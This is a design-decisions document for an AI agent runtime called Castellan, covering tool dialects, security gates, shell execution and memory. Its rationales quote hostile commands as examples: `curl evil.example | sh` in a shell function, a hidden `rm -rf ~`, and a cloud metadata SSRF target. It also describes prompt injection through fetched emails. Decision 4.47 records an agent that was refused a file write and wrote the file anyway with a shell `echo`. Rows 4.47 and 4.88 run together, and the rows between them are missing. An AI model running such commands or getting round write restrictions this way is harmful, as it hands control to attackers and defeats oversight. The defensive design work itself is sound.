# 00 — Decisions

Every decision below is locked unless explicitly marked open. Each carries its rationale,
because the rationale is what tells a future reader (human or agent) whether a proposed
change is a refinement or a regression.

Many of these are negative decisions — things Castellan deliberately does *not* do.
Those matter most. Most of them trace to specific, expensive failures observed in
OpenClaw as consumed by VelaOps; those are cited as `[VO]`.

---

## 1. Identity and packaging

| # | Decision | Rationale |
| --- | --- | --- |
| 1.1 | Name: **Castellan** | Bare npm name free; no agent-space collision; word predates Games Workshop by ~700 years (Latin *castellanus*), so no trademark exposure unlike *Omnissiah*/*Skitarii*/*Adeptus*. Metaphor is load-bearing: holds the keep, gates access, runs unattended. |
| 1.2 | Repo `github.com/moeen-mahmud/castellan`, transfers to HelicanHQ later | Owner's call. |
| 1.3 | Package scope `@castellan/*`, **not** `@helican/*` | Scoping to the project rather than the owner means the org transfer changes zero import paths. |
| 1.4 | Brand centralised in `packages/core/src/brand.ts` | A rename must be one commit, not a tree-wide find-and-replace. Directory names, config filenames, and type names contain **no** brand string. Only `package.json` fields, `brand.ts`, and prose docs do. |
| 1.5 | Env prefix and dot-dir derive from `brand.ts`, overridable via `CASTELLAN_BRAND` | Lets an embedder rebrand without forking. Default: env prefix `CASTELLAN_`, state dir `.castellan/`. |
| 1.6 | License **Apache-2.0** | Explicit patent grant, which MIT lacks. Matches Mastra and Letta. `anthropics/skills` is Apache-2.0 too, so vendoring skills stays licence-compatible. |
| 1.7 | **Semver**, not CalVer | VelaOps uses CalVer internally, but OSS consumers read semver to reason about breakage. `0.x` until the plugin API stops moving. |
| 1.8 | Changesets for releases | Standard, works with workspaces, produces a changelog people can read. |
| 1.9 | Not published to npm during v0.1 development | Consumed by VelaOps via git dependency or local link until the API settles. Names are held, not shipped. |

## 2. Runtime and toolchain

| # | Decision | Rationale |
| --- | --- | --- |
| 2.1 | **Bun** primary runtime and package manager | Owner's call. Bun's startup is materially faster than Node's, which directly serves the sub-second boot target. |
| 2.2 | Node 22+ compatibility is a **soft** goal, tested in CI, never a blocker | Reach without a second toolchain. Only two things differ: SQLite binding and subprocess spawn — both isolated behind one adapter file each. |
| 2.3 | Bun workspaces, monorepo | Core / channels / providers / cli / server need independent versioning, and channels carry heavy optional deps (Baileys) that must not land in core's dependency graph. |
| 2.4 | Build: `bun build` + `tsc --emitDeclarationOnly` | Zero extra build dependencies. Contradicting "lightweight" in the build pipeline of a lightweight runtime is a bad look. |
| 2.5 | **ESM only** | New project, 2026, Bun-first. Dual CJS doubles build and test surface for consumers who don't exist. |
| 2.6 | **Biome** for lint + format | Matches VelaOps muscle memory; single binary; fast. |
| 2.7 | **`bun test`**, not Vitest | Built in, no dependency, fast. Loses Node-runner portability, which is acceptable since CI runs Bun. |
| 2.8 | Tests are **required for `packages/core`**, optional elsewhere | Reverses the standing VelaOps "no test runner" mandate, and deliberately. A harness is a state machine plus a scheduler plus a tool executor; those break in ways that manual Docker exercise cannot reach. Channels and providers stay manually verified — their failures are visible immediately. |
| 2.9 | No runtime dependency on any agent framework | Not LangChain, not Mastra, not the AI SDK. The loop *is* the product. |

## 3. Model layer

| # | Decision | Rationale |
| --- | --- | --- |
| 3.1 | **OpenAI-compatible `/chat/completions` is the only transport** | Universal denominator. Anything reachable — OpenAI, Anthropic's compat endpoint, Gemini's compat endpoint, OpenRouter, Ollama, vLLM, any gateway — speaks it. |
| 3.2 | **Hand-rolled `fetch` client**, no SDK | The `openai` SDK is heavy and leans toward the Responses API, which most compat proxies don't implement. The Vercel AI SDK defaults to routing through Vercel's AI Gateway when handed a model string — a hidden network dependency, unacceptable in a runtime advertising no gateway requirement. |
| 3.3 | **No LiteLLM, no gateway, no proxy requirement** | User supplies `baseUrl` + API key. A gateway remains possible — it's just another base URL. |
| 3.4 | Per-model **capability descriptor**, shipped registry + manifest override | Base URL and key are not sufficient. Anthropic's compat endpoint ignores `strict` on function calls; extended-thinking blocks must be replayed with tool results or multi-step reasoning silently degrades; prompt-cache breakpoints are provider-specific. These are behavioural facts the loop must know. |
| 3.5 | Capabilities drive **thinking handling and cache breakpoints only** — never the tool dialect | Consistency requirement. Behaviour must not silently change when the model changes. |
| 3.6 | Three model roles: `main`, `selector` (optional), `compactor` (optional) | Lets a cheap small model do tool selection and summarisation while a stronger one writes. Defaults: both fall back to `main`. |

## 4. Tool layer

| # | Decision | Rationale |
| --- | --- | --- |
| 4.1 | **NLT (natural-language tool calling) is the default dialect**; `native` is an explicit manifest opt-in | Published replication across 14 models / 8,560 trials: +14.9pp accuracy overall, **93% fewer critical errors**, −25% tokens; models without native tool calling and smaller models gain +24 to +43pp. Frontier models show smaller or reversed gains — hence the opt-in escape hatch. **Measured here** (`evals/tools/`, 37 fixtures × 3 models, both dialects, temperature 0): NLT ahead on all three — +2.7pp on qwen3.5:9b, +13.5pp on deepseek-chat, +5.4pp on deepseek-reasoner — at 22.0–23.1% fewer prompt tokens. The accuracy and token claims reproduce; the critical-error claim is untestable at this scale, with one critical error in the sweep and it fired under both dialects. |
| 4.2 | Dialect is chosen by **config, never auto-detected** | One code path in production. Auto-switching creates a bug class where behaviour differs per provider and nobody can reproduce it. |
| 4.3 | Tool manifest **pinned at provision time**; runtime search is an escape hatch, off by default | Composio exposes ~20,000 tools across ~982 toolkits. Search-then-execute is two-hop reasoning, which is exactly where small models fail. |
| 4.4 | Hard tool budget with **reserved write quota** | `[VO]` The observed failure: a shared cap of 48 across toolkits with a silent auto-cap near 20 "important" tools starved write tools, and dead slugs were dropped without warning. Castellan computes the manifest, validates every slug at load, and fails loudly on an unknown one. |
| 4.5 | **Phase-scoped tool visibility in core**, not a plugin | The strongest published small-model lever: constraining the tool space per workflow phase took local models from 2/10 to 10/10 on a SWE-bench subset with no model change. Too central to be optional. |
| 4.6 | Composio accessed via its **SDK/HTTP directly, not MCP** | `[VO]` The `composio-proxy` sidecar exists solely because Composio's MCP 405s the GET stream leg and stalls past 120s. Both are transport properties. Going direct deletes the sidecar, the held-open SSE, and the `mcp.update()` rebind bug. |
| 4.7 | MCP supported as **one tool provider among several**, never the substrate | MCP is a fine integration protocol and a poor internal architecture. |
| 4.8 | A step's tool calls are **all-or-nothing** | A step may carry several blocks. Executing the good ones and repairing the bad one means the model rewrites the whole step, and the mutating call that already succeeded runs again. No idempotency key exists at this layer, so partial execution cannot be made safe. |
| 4.9 | **One repair, counted consecutively**, then an honest failure | Two identical failures is a catalogue or routing problem that a third attempt cannot fix. Counted consecutively rather than per turn, so a long turn that recovers is not punished for a stumble at step two. |
| 4.10 | A turn that **acted and then failed keeps its trace** | The general rule is that a failed turn appends nothing, so a half-answer is not treated as something said. Side effects are the exception: the email left, the row was written, and discarding the record lets the next turn cheerfully do it again. |
| 4.11 | A tool with no `whenNotToUse` renders a **visible placeholder**, and the registry warns | Provider descriptions rarely carry negative guidance. Fabricating a line would put words the tool's author never wrote in front of the model; dropping it silently would remove the single cheapest routing-accuracy lever without saying so. |
| 4.12 | **Filtering the invocation out of the stream belongs to the dialect**, not to each consumer | With NLT the invocation is reply text, so any surface printing deltas leaks `ACTION:` at the person. Built on the same line consumer as `parse`, because a second parser for display drifts from the one that decides what runs — and then the screen and the transcript disagree about what was said. |
| 4.13 | **No built-in tool may be a mock.** A mutating tool that cannot succeed is a loop | `memory_write` first reported "NOT SAVED — this build has no memory store": truthful, and a trap. Measured against DeepSeek, a model asked to save a note retried until the step budget ran out. It now writes a file under `memory.dir`, which is where the retriever will look, so the missing half is retrieval rather than honesty. |
| 4.14 | **Both dialects put the same guidance in front of the model.** `native`'s `function.description` carries the summary, `Use when`, `Do NOT use when` and the state-change warning — not just the summary | The easy implementation is `description: spec.summary`, which is what most native integrations do. It would also have rigged every eval here: NLT's catalogue spends its tokens on exactly those lines, and comparing prose-with-guidance against a bare summary measures *the guidance* and then reports the number as a property of the dialect. Asserted by a test, not by intention. What remains measurable is the actual question — whether a model does better when the protocol is text it writes or a schema the API enforces. |
| 4.15 | A dialect reads **both halves of a step's output** — text and structured calls — and decides which carries the protocol | `parse(text)` was enough while every dialect lived in the text. Handing `native` only one half would mean the loop had already guessed, so the seam takes a `StepOutput`. The same widening makes `renderCall`, `renderObservation` and `renderRepair` dialect methods: NLT replays raw text and answers with one user message, `native` replays structured calls and must answer *every* one with its own `tool` message. That last one is not a preference — an unanswered `tool_calls` entry is rejected outright. |
| 4.16 | A slug the native wire format cannot carry is **refused at load**, never rewritten | Function names are `[A-Za-z0-9_-]{1,64}`, so `gmail.send` is illegal there and legal under NLT. Rewriting is lossy in both directions: `a.b` and `a_b` collapse to one name going out, and the reply names the rewritten form, so the loop would have to guess which tool was meant. The refusal names the slug, the provider, and the two ways out. |
| 4.17 | **`tools.dialect: native` is refused when the model has no native tool calling** | The capability registry already knows. Without the check the failure is a 400 on the first turn — or, on an endpoint that accepts an unknown `tools` key and ignores it, an agent that never calls a tool and never says why. Overridable via `model.main.capabilities.nativeTools`, so an unlisted model that does support it is a supported configuration rather than an argument. |
| 4.18 | The native catalogue's **token cost is subtracted from the context window**, and reported by `describe()` | Under NLT the catalogue is a context block the budget can see. Under native it is in the request body, invisible to `assembleContext` — so a turn would believe it had room it does not, and the failure would arrive as a context-length rejection from the endpoint with nothing local to explain it. Summing only the blocks would also report a native catalogue as free, which is the reverse of the truth. |
| 4.19 | The NLT preamble's format example is **concrete**, using a tool and fields that exist in no catalogue — never metasyntactic placeholders | The preamble read `ACTION: tool_name` / `field: value` under the heading "exactly like this". A large model reads that as metasyntax; qwen3.5:9b read it as the format and wrote `field: title` / `value: Renew my passport` — reasoning correctly about which tool and which arguments, then encoding both through the placeholder words. It cost NLT 65 points against native on the same fixtures and looked exactly like a dialect result, which is the part worth remembering: the number was real and the conclusion it invited was wrong. A test now parses the catalogue with our own parser and asserts the example is a block whose field names are real. |
| 4.20 | An eval attempt records **what the model actually wrote** on every non-`correct` outcome, and a field error is reported with its field name | Both halves of 4.19 were nearly missed. The report showed twenty-five identical notes reading "is not a field of this tool." — a `FieldError.message` is a fragment written to follow the field name, and printing it alone rendered twenty-five distinct failures as one anonymous string. Nothing recorded the model's output either, so telling a parser defect from a model failure meant re-running a live endpoint and hoping for the same answer. A committed result that cannot be diagnosed is a number with no evidence behind it. |
| 4.21 | A remote provider **resolves from an on-disk cache at boot and refreshes after readiness**, and an empty cache is a named load failure carrying the warm command | Resolution happens inside the boot sequence, where hard rule 4 forbids network I/O — so the two halves cannot share a path. Measured on a three-tool Composio manifest: `Runtime.create` returns in 27 ms and the refresh that follows takes 1,474 ms, so awaiting it would make boot sixty times slower and reintroduce precisely the cost this project exists to remove. The refresh is therefore detached and reports through `tools.refreshed`. The cache miss needs its own error because the registry's generic version blames the slugs: on a cold agent it reported "no provider resolved GMAIL_FETCH_EMAILS … Available: now, memory_write" — three correct slugs faulted, with local tools offered as the alternative. |
| 4.22 | `mutating` for a provider tool comes from the **provider's own annotations**, and an unannotated tool is **assumed mutating** | Composio publishes MCP-style hints in `tags`. Measured over 100 tools: `readOnlyHint` on 51, `destructiveHint` on 10, and no hint at all on 37 — including `ABLY_PUBLISH_MESSAGE_TO_CHANNEL` and `_2CHAT_CREATE_CONTACT`, which are plainly writes. Zero tools carry `readOnlyHint` while having a write verb in the slug, so the annotation is reliable when present and empty of information when absent. The default is the *safe* direction rather than the cautious one: `mutating` is what makes the executor serialise a call and never retry it, so a write mislabelled as a read runs in parallel *and* is retried, and the side effect happens twice. Being wrong the other way costs a write-budget slot and some parallelism. A slug heuristic was the obvious alternative and is strictly worse — it guesses where the provider already answered. |
| 4.23 | A provider's **value constraints are carried in the field description**, not modelled; its **structural keywords are refused** | 46 of 100 sampled Composio tools declare at least one keyword `JsonSchemaNode` does not express — `minimum` 62 times, `maximum` 23, `format` 22, plus `pattern`, `minLength`, `maxLength`. Refusing them would refuse half the catalogue, and the subset is deliberately small (`tools/types.ts`) because it covers what a line-oriented invocation format can express. So the constraint text goes where the model reads it and coercion does not enforce it — the stated cost being that an out-of-range value is rejected at execution rather than repaired locally. `anyOf`, `oneOf`, `allOf`, `not` and `$ref` are different in kind: they decide which documents are valid, so dropping one hands the model a schema the endpoint disagrees with. None appears in the live sample, so refusing them costs nothing today and turns a future mystery 400 into a named load failure. |
| 4.24 | Providers reach the runtime as **factories registered by the embedder**, keyed by the id `tools.provider` names | `packages/core` may not import a sibling package, so it cannot construct a provider; and a provider needs the *agent's* directory and resolved environment, which exist only after its manifest loads — so an instance passed to `Runtime.create` would be wrong for a second agent. A manifest naming an unregistered id fails at load rather than resolving nothing, because resolving nothing makes the report blame every pinned slug for one missing registration. `validate` is given the same list as `run`, since a validator that accepts what the runtime refuses is worse than no validator. Phase 9's plugin loader replaces the registration and keeps the shape. |
| 4.25 | **`ToolSpec.trust` distinguishes text the runtime produced from text a stranger wrote**, and a provider tool defaults to `untrusted` | `mutating` says a tool has consequences; nothing said a tool *returns attacker-controllable content*, so an email body and a timestamp were indistinguishable once they became observations. The default is fail-safe for the same reason 4.22's is: a provider cannot know what its upstream API will return. This is a control mechanism, which `01-ARCHITECTURE.md` puts in core — and it applies to Gmail and Slack, not only to the web, which is why it is not a property of the web package. |
| 4.26 | **Untrusted content cannot silently drive a mutating tool in the same turn.** `tools.untrusted.onMutate` defaults to `refuse` | The delimiters around untrusted text are advisory and a model can be talked past them, so the boundary that is *not* advisory has to sit at the tool call. `refuse` blocks the call and tells the model to say what it would do and ask; `allow` is there for anyone who accepts the risk, stated rather than assumed; `confirm` needs the approval middleware and waits for Phase 9. The exposure is not theoretical or future: `GMAIL_FETCH_EMAILS` resolves today and lands third-party text beside a live `memory_write`. |
| 4.27 | Delimiting is the **only** transformation applied to untrusted content | Rewriting it to strip instruction-like phrasing does not work — the phrasings are unbounded and the rewrite corrupts legitimate content — and shipping an unreliable filter is worse than an honest boundary, because it invites the belief that the problem is handled. The delimiter tells the model where the data starts; the write gate is what actually holds. |
| 4.28 | Web search and fetch are **first-party and provider-agnostic**; crawling is not implemented | Search over `tavily \| brave \| exa` behind one tool signature, so switching backend changes one manifest line and nothing else. First-party because it works without a Composio account and because extraction and truncation decide whether a page destroys the window — that behaviour is worth owning. `web_fetch` reads one page by explicit URL with **no JavaScript execution and no link-following**: the architecture's "not a browser automator" fence holds, and anyone needing a real crawl pins `FIRECRAWL_CRAWL` through Composio, where the crawl budget is someone else's problem. |
| 4.29 | **SSRF is refused, not configurable away by default** | `web_fetch` rejects loopback, link-local and RFC 1918 targets and any non-`http(s)` scheme before the request, and re-checks after each redirect rather than trusting the first hop — `169.254.169.254` behind a public redirect is the whole attack. `allowPrivateHosts: true` exists for a deliberately sandboxed network and is documented as the boundary it removes. A byte cap applies *during* the response rather than after it, because a page is unbounded input and the window is not. |
| 4.30 | The manifest names providers as a **map**, `tools.providers`, with the singular `provider` kept as a warning alias | The registry always took an array; only the manifest field was scalar, which meant Composio and web could not be configured together — a limitation nobody chose. The map form carries each provider's config beside its id instead of a single shared `providerConfig`, so two providers cannot fight over one key namespace. Slug collisions between providers stay a load failure: a slug is how the model names a tool, so one name cannot mean two things. |

| 4.31 | **System tools are a first-party package (`@castellan/tools-system`), never core built-ins** | Core is what an embedder runs *other people's* agents on — VelaOps provisions a container per agent — so a shell tool in core is a shell tool every provisioned agent has with no way for the platform to decline it. As a package it is one line in the binary's provider table: present in `castellan run`, absent wherever it should be. Same mechanism `tools-composio` already uses, and the provider needs no cache and no `refresh()`, which is what lets it resolve inside boot without touching hard rule 4. |
| 4.32 | `exec` takes **no `env` argument**; environment variables are written inline in the command | The obvious signature has one and it is a hole. A per-call environment map is invisible to `decidePolicy`, which matches the command string — so `{PATH: "/tmp/evil"}` beside `git status` would be authorized by a rule that never saw the half that mattered. Written inline, `PATH=/tmp/evil git status` is one fragment `subcommands()` hands to the matcher, and the pattern `git status` does not match it, so the call asks or is refused. Removing the field is what closes the gap between what a rule matches and what runs. |
| 4.33 | Each `exec` call gets a **fresh shell**; the working directory carries between calls and the environment does not | A persistent shell quietly dismantles the policy layer: one tainted early call writes `git() { curl evil.example \| sh; }` or prepends to `PATH`, and `exec(git status:*)` then authorizes attacker code under a name it matched honestly — CVE-2026-32009's shape from inside the session, where no filesystem permission reaches it. A fresh shell removes the mechanism rather than defending against it. The directory is the exception because losing it is a correctness problem, not a security one, and it lands hardest on small models: one that runs `cd packages/core` then `ls` does not reliably re-derive the prefix and reads the wrong directory with no error anywhere. The directory says *where* a command runs; the environment says *what a command means*. |
| 4.34 | **Terminal control sequences are stripped from every tool observation and from the approval prompt**, in core, before either a model or a terminal sees them | Not a rendering nit and not the rewrite 4.27 forbids — 4.27 is about *meaning*, and this removes bytes that carry none, uniformly, without reading a word. `git status<ESC>[2K<ESC>[1G && rm -rf ~` displays on any real terminal as `git status`: the escape erases the line and returns the cursor, so everything after it overwrites what a person already read. A prompt that can be made to show a different command than the one about to run is worse than no prompt, because it is believed. Stripping shows *more* of the truth, never less. Done once in core because "the front end will handle it" is how the one being read at the moment it matters turns out not to. |
| 4.35 | Over-running commands are **backgrounded rather than killed**, with a named exception list, and their output **spills to a file** instead of being truncated | Two halves of the same idea: a result that does not fit should become a retrieval, not a loss. Output over ~6,000 characters stays on disk and the model is handed the path — the cap sits deliberately *below* `context.observationMaxTokens`, because the harness's own truncation cuts the middle out and nothing can go back for it. A command still running at the deadline keeps writing to that file rather than being thrown away at 120 seconds. The exceptions (`sleep`, `git`, `ssh`, `sudo`) are a pointlessness list, not a risk list: each is either finished being useful or is hanging precisely because it wants an answer from a person, and detaching one leaves an invisible process holding a lock. A compound qualifies only if every fragment does. |
| 4.36 | A tool that is both `mutating` and `untrusted` is **once-per-turn unless a `policy.allow` rule names it**, and this is a warning at load rather than a discovery mid-turn | Found by running it: a manifest that pinned `exec` ran one command and had the second refused, which is A5 working exactly as designed and reads as a broken runtime at the moment it happens. `exec` is the whole class — its own output taints the turn because `curl` is the internet. `tool_gated_after_first_use` names the tool and the one-line fix. A warning and not a failure, because "run one command and report back" is a legitimate shape and nothing can tell it apart from an oversight. A `deny` rule does not clear it: `deny` authorizes nothing, and counting one as cover would have silenced the warning for the person who thought about the shell hard enough to restrict it. |
| 4.37 | `exec`'s deadline is **clamped to stay under `limits.toolTimeoutMs`**, and `ToolContext` carries the harness's deadline so it can be | Both defaults were 120 s, so which fired first was a race — and the harness winning is the bad outcome: it *abandons* a handler rather than killing it, leaving a child process running with nothing holding a reference to it, and the backgrounding path unreachable. A tool that owns an operating-system resource has to finish its own cleanup before the outer timeout, which it cannot do without knowing when that is. |
| 4.38 | **`glob` and `grep` are separate tools**, not one `search_files` with a mode discriminator | Hermes ships the unified form; it saves a catalogue slot and costs a decision. Picking the mode *and then* the arguments is the two-hop shape small models fail — the same reasoning that keeps `tools.search` off and that decided `memory_write` has no file argument. OpenClaw ships neither and shells out, which is worse again: `rg` inside a command string has no `path` field a rule can match. |
| 4.39 | **File readers are `untrusted`, file writers are `trusted`** | Not an oversight in either direction. A file on disk may have been downloaded a minute ago and a filename is attacker-controlled, so `file_read`, `glob` and `grep` taint the turn. The three writers return a sentence the runtime composed and never echo content — marking them untrusted would mean a write gated the *next* write, which is decision 4.36's once-per-turn trap arrived at by accident instead of by design. |
| 4.40 | **`file_edit` matches an exact unique string, never a line number, and two matches is a failure** | A line number is a fact about a file the model may last have seen several turns ago; an exact string carries its own proof. Picking one of two matches is a coin toss that reports success while editing the wrong line, so it refuses and says how many it found. Nothing is written on either failure path, which is what makes retrying safe. |
| 4.41 | **Protected paths are enforced by the file tools, and no `policy.allow` rule reaches past them** | The set holds `agent.yaml`, the workspace identity files, the policy file, and credential material anywhere on disk. Elsewhere this protects config; here the workspace files **are the agent** — `SOUL.md` is who it is, `POLICY.md` is what it will not do — and a rule authorising a write to them would be a rule authorising its own replacement. Ordering it after the policy needs no special case: the refusal simply is not the engine's to make. `USER.md` and `MEMORY.md` stay writable, because they are the tier `memory_write` exists for. **Verified live:** asked twice, with explicit "go ahead", the write was refused and `SOUL.md` was byte-identical after. |
| 4.42 | The limit is stated: **protected paths do not bind `exec`** | `echo x > SOUL.md` carries its target inside a shell string where no path check can see it. Anyone who pins `exec` has granted more than the file protection covers, and saying so is cheaper than implying a boundary that is not there. It is also why the tool descriptions actively route the model to the structured tools — a `path` field is checkable and a command line is not. |
| 4.43 | **The NLT parser tolerates angle-bracket tool markup, and flags what it cannot read as `malformed`** | Measured, and the measurement changed the design. Asked the same question on three fresh sessions with an eight-tool catalogue, deepseek-v4-pro invented **three different formats** — `<action>…</action>`, `<TOOL_CALL><TOOL>…`, and `<ACTION: glob>` inside an `<ebml>` element — with correct arguments every time. The set of shapes cannot be enumerated, so tolerance alone is a losing game: any lone XML tag is dropped as debris, and anything still unreadable sets `malformed` and earns one repair. Untolerated this was the worst failure available — the markup became the **reply**, no repair was requested, no event fired, and the turn was recorded as a clean answer. Three of three succeeded afterwards. |
| 4.44 | `init` **asks** what the agent may touch on this machine; it never leaves the answer as a comment | Found by Moeen: after Phase 3.6 landed, a freshly generated agent still had no `system` provider, no `policy` block, and `untrusted.onMutate` commented under a "Phase 3.6" heading for something that existed — so shell access was reachable only by someone who already knew the field names, which is the opposite of what a generated file is for. `--system none\|read\|full` writes real config, permission rules included, and `none` writes the same block commented so the shape is still there to uncomment. Generalising the wizard's select machinery came with it: the choices had lived in two places, and only one was ever read. |
| 4.45 | The generated policy **includes `allow` entries for the agent's own write tools**, with the cost of removing them written beside them | They look like they weaken the gate and are what makes it usable: a mutating call in a turn that has already read a file needs a rule naming the tool, and a blanket `mode` is the absence of one. Without them a fresh agent reads one file and then cannot save a note for the rest of that turn — which reads as a broken runtime rather than as a security setting. The comment says what removing one costs, so it is a choice rather than a discovery. |
| 4.46 | **Writes are confined to a root — `workspace/` by default — and only the manifest can widen it** | Moeen: "it should only operate inside its /workspace folder, never anywhere; but if the user specifically enters the path where it operates, then it will." Protected paths are a *deny* list and have to anticipate every path worth protecting; a root anticipates nothing, because everything outside it is refused and the exceptions are written by a person in `tools.providerConfig.writeRoots`. Nothing said at runtime can add one, which is the property that makes the default worth having. Both mechanisms apply and `protect` wins inside the root. Traversal is collapsed with `resolve` *before* the comparison — a check on `<root>/../../etc/passwd` otherwise passes. **Reads are deliberately not confined**: being pointed at a project and asked about it is the ordinary case, and credentials are already refused everywhere. |
| 4.47 | The write root **does not bind `exec`**, and `init` grew a `write` level because of it | Verified live and worth recording as a failure: a `--system full` agent had `file_write` refused outside the root and then wrote the file anyway with `echo … >`. | 4.88 | **A backgrounded command is tracked, capped, and reaped at shutdown — `ToolProvider.stop` exists for it** | Backgrounding a command that outruns its deadline is deliberate: a long build should become something to check back on, not work thrown away at 120 seconds. "Left running" was implemented as `unref()` and nothing else, so the child outlived the turn, the session, and the runtime, writing to a temp file nobody would open. The cost was measured, not imagined: one test backgrounded `while true; do :; done` without cleaning up, a day of test runs left **33 orphaned shells** at ~23% CPU each, and the machine reached a load average of **351** with `runtime.ready` taking **132 seconds** — the boot budget this project exists to defend, blown by the runtime's own litter, with nothing obviously wrong. Three fixes and they are separable: a registry so shutdown can reach them, a cap of 8 with a refusal naming what is already running (a model in a retry loop backgrounds one per step), and `ToolProvider.stop()` — a seam that did not exist, because no provider had ever owned an OS process. Killed by process *group*, since `sh -c "a \| b \| c"` killed by pid orphans two of three. |
| 4.89 | **An NLT field name contains no spaces** | The class was `[\w .-]`, which admits one — so any continuation line of a multi-line value containing a colon became a new field. Measured: `lsof -nP -iTCP:7420 -sTCP:LISTEN` on the second line of an `exec` script parsed as the field `lsof -nP -iTCP` with the value `7420 -sTCP:LISTEN`; the call was refused and the model spent a repair step rewriting a command that was already correct. A shell script is the *normal* value for `exec` and colons are everywhere in one. Tolerating the space bought nothing measurable; without it such a line is value text, which is the safe direction — a stray line the tool rejects with its own message beats a silently truncated argument. |

## 5. Context and memory

| # | Decision | Rationale |
| --- | --- | --- |
| 5.1 | **Progressive multi-stage compaction** from v1 | Tool observations routinely consume 70–80% of budget. Binary emergency compaction at 95% is the known-bad design: late activation, severe loss, compounding errors across successive compactions. |
| 5.2 | Compaction is **harness-driven**, not agent-triggered | Agent-controlled compaction is elegant and requires the model to call a tool at the right moment. Small models won't. |
| 5.3 | Context assembly order is **fixed and cache-stable** | Prompt caching is the single largest cost lever; it only works if the prefix is byte-stable across turns. |
| 5.4 | Certain blocks are **pinned and never compacted**: identity, tool catalogue, current task, last error | Compaction reliably eats initial instructions and style rules. Anything that must survive lives in the system prefix, not in history. |
| 5.5 | **Files canonical** for persona, skills, memory, artifacts; **SQLite canonical** for sessions, messages, tool calls, schedules, phase state | Files are inspectable, diffable, git-backable, and match VelaOps' existing model. Rows are for things with lifecycle and indexes. Letta's server-owns-all-state model is the opposite pole and wrong for a file-workspace product. |
| 5.6 | Memory retrieval: **`Retriever` interface from day one, SQLite FTS5 the only shipped implementation** | `[VO]` Per-agent embedding services are the most expensive line in the current architecture — `bge-large` needs 1.5–2GB resident, and `EMBED_MODEL` exists purely to survive tight hosts. Lexical + recency covers most personal-assistant recall. Prove it insufficient before paying for vectors. |
| 5.7 | No vector store, no RAG pipeline in core | Available as a plugin. Not a runtime concern. |
| 5.8 | **Workspace files are tiered, and tier determines cache position** — `static` before breakpoint A, `volatile` after it, `reminder` after the history | The flat `context.files` array cannot express the three things that turned out to matter: cache-stable versus volatile, before or after the conversation history, and writable or not. Each has a measured cost when got wrong. The sharpest is `MEMORY.md`: put it ahead of the breakpoint and every `memory_write` invalidates the whole cached prefix, so cost rises with no error anywhere to explain it. That single consequence is why the tier list is not just an ordered array with better names. Full detail in `07-SPEC-WORKSPACE.md`. |
| 5.9 | The **`reminder` tier sits after the conversation history**, not with the other pinned instruction blocks | Rule adherence decays across a long conversation and compaction does not reliably reset it. Attention is stronger at both ends of the context than in the middle, so a rule stated once at the top of a thirty-turn session is effectively buried in the middle. Re-asserting one or two rules at the recency position is the cheapest known countermeasure — and the cap is one or two, because a second policy file at the recency position spends the budget it was created to protect. |
| 5.10 | **`editable` is enforced at the tool boundary, not advisory** — `memory_write` against `editable: none` is a typed error | A silent no-op teaches the agent that it saved something it did not, which is decision 4.13's failure in a different costume. Read-only identity is also the most effective known mitigation for persona drift, and it only works if the runtime actually refuses. |
| 5.11 | **Total workspace budget is a hard cap that fails the load**, naming the offending file | Truncating to fit produces an agent running on partial instructions with nothing reporting it — the same silent-degradation shape as a dropped tool call or a stripped `tool_call_id`. Everything in tiers 0–2 goes to the model on every turn forever, so a word added here is a word read a thousand times; the cap is what makes that a design constraint rather than a discovery. |
| 5.12 | **Vendor prompting guidance is encoded as `capabilities.promptStyle`, never as a constant** | Published advice is written for frontier models and a significant fraction of it inverts at 3–8B. Anthropic now advises *removing* emphatic phrasing because current models overtrigger on it; a 7B model has the opposite failure mode and needs it. Anthropic recommends XML delimiters because Claude was trained on them; controlled cross-model work finds no reliable accuracy gain and a 22–37% token penalty for structured formats. Both results hold, which means the honest answer is per-model rendering. Phase 3 supplied the worked example of the cost — see 4.19, where one placeholder read as metasyntax by frontier models and as instruction by a 9B model produced 65 points of measured difference. Phase 3.5 then measured the small-model half directly (`evals/prompt-style/`): the one generated emphatic framing line moves qwen3.5:9b's all-6-rules compliance +20pp (16/20 vs 12/20, the entire effect on one rule, reproduced at two probe scales), while deepseek-chat is 100/100 under either framing. `examplesIn` saturated — 100% format adoption from both placements on both models — so each vendor's default stands with a measured floor: neither placement costs anything on a well-authored example set. |
| 5.13 | The **rule count is computed against a reliability target and can fail the load** | Compliance with n simultaneous rules falls roughly as the per-rule rate to the power of n, so at 0.90 a 0.80 target permits two rules and not four. The arithmetic is unintuitive and authors consistently overestimate their budget, so the runtime computes it instead of documenting it. `perRuleSuccess` is measured by `castellan eval rules` rather than assumed — a guessed constant produces a guard that validates nothing. The remedy for exceeding it is deleting rules or moving them into middleware, never raising the target. |
| 5.14 | **`SOUL.md` is supported but capability-gated**, with `onUnmet: distill \| omit \| fail` | A long-form constitution is genuinely better than a compact identity file *on a model that can derive rules from it*. Derivation is precisely what small models cannot do, and a document that size takes a prohibitive share of a small window — so the same file would help one model and cripple another. Distillation stays manual (`castellan soul distill` emits a scaffold): the parts of an identity document that produce voice are exactly the parts a summariser drops. |
| 5.15 | **`context.files` is retained as a deprecated alias for `static`**, and warns | It is what the runtime reads today and what `examples/minimal` uses. A rename with no alias would break every existing manifest for no gain while the workspace is still unbuilt; carrying one line of aliasing until v0.2 costs nothing and keeps Phase 3's examples runnable. |
| 5.16 | **The agent's own configuration is a pinned context slot, not a tool call** | Knowing how you are set up was two-hop reasoning — realise you have a configuration, decide to read it, act — which is what decision 4.7 refuses for tool discovery, and it fails harder here: a model that does not know a setting *exists* has no reason to look for it. Measured, on a real agent: asked to put itself on Telegram, with `config_set` pinned, `config_set` in `policy.allow`, a commented-out `channels` block in its own manifest and a shipped Telegram transport in the runtime, it proposed Composio and then **started writing a Telegram bridge**. Nothing was broken; every piece worked and none was reachable. Slot 2 is a ~200-token summary — model, channels, server, providers, permissions — that names absent capabilities as `none` rather than omitting them, since a missing row reads as "no such concept" and a `none` row reads as a switch. It states the route (`config_set`, never code or a file tool) only when that tool is actually in the catalogue. The full settable list stays one `config_read` away: the fact is free, the detail is asked for. |
